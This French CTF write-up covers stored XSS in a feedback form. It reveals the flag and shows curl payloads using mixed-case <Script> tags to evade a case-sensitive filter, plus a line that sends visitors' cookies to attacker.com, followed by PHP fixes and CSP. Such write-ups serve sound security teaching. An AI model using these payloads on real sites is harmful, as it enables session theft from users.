# Stored XSS - Weak Input Validation

## Description de la faille

La page de feedback implémente une validation insuffisante contre les injections XSS. Le système détecte les tentatives contenant le mot "script" et révèle le flag, mais cette détection peut être contournée en utilisant des variations de casse, permettant une exploitation XSS réelle.

## Obtention du flag

### Méthode simple

Dans le formulaire de feedback, entrer simplement le mot "script" dans le champ Name ou Message déclenche le système de détection :

**Input :**
```
Name: script
Message: test
```

**Résultat :**
```
Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

Le système détecte toute sous-chaîne continue du mot "script" (a, sc, pt, etc.).

## Exploitation de la vraie faille XSS

### Restrictions frontend

Le formulaire implémente plusieurs validations côté client :
```html
<input name="txtName" type="text" maxlength="10">
<textarea name="mtxtMessage" cols="50" rows="3" maxlength="50"></textarea>
```

**Validations observées :**
- Longueur maximale : 10 caractères pour Name, 50 pour Message
- Champs obligatoires (validation JavaScript)
- Sanitization qui retire les balises `<script>` en minuscules

### Bypass des restrictions

Ces restrictions peuvent être contournées en interceptant la requête et en modifiant les payloads en dehors du navigateur.

#### Méthode 1 : Utiliser curl

**Payload XSS avec majuscules :**
```bash
curl -X POST "http://localhost:8080/?page=feedback" \
  --data-raw "txtName=<Script>alert('XSS')</Script>&mtxtMessage=test&btnSign=Sign+Guestbook"
```

**Résultat :** Le commentaire est enregistré avec les balises `<Script>` intactes.

#### Méthode 2 : DevTools du navigateur

1. Ouvrir DevTools (F12) > Onglet Network
2. Soumettre le formulaire normalement
3. Clic droit sur la requête POST > "Copy as cURL"
4. Modifier le payload dans la commande curl
5. Exécuter la commande modifiée

### Exploitation réussie

Après avoir envoyé le payload via curl, recharger la page de feedback dans le navigateur :

**Résultat :** Une popup JavaScript apparaît → **Stored XSS confirmé** ! 🚨

Le payload est stocké en base de données et s'exécute pour chaque visiteur qui consulte la page.

## Vulnérabilités identifiées

### 1. Case-Sensitive Filter (CWE-178)

Le filtre anti-XSS est sensible à la casse et ne détecte que `<script>` en minuscules.

**Code vulnérable (hypothèse) :**
```php
<?php
$name = $_POST['txtName'];

// Filtre sensible à la casse - VULNÉRABLE
$name = str_replace('<script>', '', $name);
$name = str_replace('</script>', '', $name);

// Affichage sans échappement - VULNÉRABLE
echo "<td>Name : $name</td>";
?>
```

**Test des variations :**

| Input | Filtré ? | XSS possible ? |
|-------|----------|----------------|
| `<script>alert(1)</script>` | ✅ Oui | ❌ Non |
| `<Script>alert(1)</Script>` | ❌ Non | ✅ **OUI** |
| `<SCRIPT>alert(1)</SCRIPT>` | ❌ Non | ✅ **OUI** |
| `<ScRiPt>alert(1)</ScRiPt>` | ❌ Non | ✅ **OUI** |

### 2. Client-Side Validation Bypass (CWE-602)

Les restrictions de longueur et les validations JavaScript peuvent être facilement contournées :

**Restriction frontend :**
```html
maxlength="10"  <!-- Limite à 10 caractères -->
```

**Bypass :**
```bash
# Payload de 29 caractères envoyé directement au serveur
txtName=<Script>alert(1)</Script>
```

Le serveur ne vérifie **pas** la longueur côté backend.

### 3. Stored XSS (CWE-79)

Le payload malveillant est :
- Stocké en base de données
- Affiché sans échappement HTML
- Exécuté pour chaque visiteur

**Impact :**
- Vol de cookies de session
- Redirection vers des sites malveillants
- Defacement de la page
- Keylogging
- Propagation automatique (XSS worm)

### 4. No Output Encoding

Les données utilisateur sont affichées directement dans le HTML sans `htmlspecialchars()` ou équivalent.

## Scénario d'attaque

### Étape 1 : Reconnaissance

L'attaquant identifie le formulaire de feedback et teste un payload XSS standard qui est filtré.

### Étape 2 : Bypass du filtre

L'attaquant utilise curl pour envoyer un payload avec majuscules :
```bash
curl -X POST "http://localhost:8080/?page=feedback" \
  --data-raw "txtName=<Script>document.location='http://attacker.com/steal?c='+document.cookie</Script>&mtxtMessage=test&btnSign=Sign+Guestbook"
```

### Étape 3 : Exploitation

Le payload est enregistré. Chaque visiteur de la page feedback exécute le script et envoie ses cookies à l'attaquant.

### Étape 4 : Session hijacking

L'attaquant récupère les cookies de session et peut usurper l'identité des victimes.

## Solution de correction

### 1. Échapper systématiquement les outputs
```php
<?php
// Toujours échapper lors de l'affichage
$name = htmlspecialchars($_POST['txtName'], ENT_QUOTES, 'UTF-8');
$message = htmlspecialchars($_POST['mtxtMessage'], ENT_QUOTES, 'UTF-8');

echo "<td>Name : $name</td>";
echo "<td>Comment : $message</td>";
?>
```

**Résultat :**
```
Input:  <Script>alert(1)</Script>
Output: &lt;Script&gt;alert(1)&lt;/Script&gt;
```

Le navigateur affiche le texte au lieu de l'exécuter.

### 2. Validation côté serveur
```php
<?php
// Valider la longueur côté serveur
$name = $_POST['txtName'];

if (strlen($name) > 10) {
    http_response_code(400);
    die("Name too long");
}

// Valider le format
if (!preg_match('/^[a-zA-Z0-9 .,!?\'-]+$/', $name)) {
    http_response_code(400);
    die("Invalid characters");
}
?>
```

### 3. Content Security Policy (CSP)

Ajouter un header CSP pour bloquer l'exécution de scripts inline :
```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
?>
```

Même si un XSS passe, le navigateur bloquera l'exécution.

### 4. Ne jamais se fier aux validations frontend

**Principe fondamental :**
> Toujours valider et filtrer côté serveur, même si une validation existe côté client.

Les validations frontend (maxlength, JavaScript) :
- ✅ Améliorent l'expérience utilisateur
- ❌ Ne protègent **pas** contre les attaquants

## Références

- OWASP: XSS Prevention Cheat Sheet
- OWASP: XSS Filter Evasion Cheat Sheet
- CWE-79: Cross-site Scripting (XSS)
- CWE-178: Improper Handling of Case Sensitivity
- CWE-602: Client-Side Enforcement of Server-Side Security
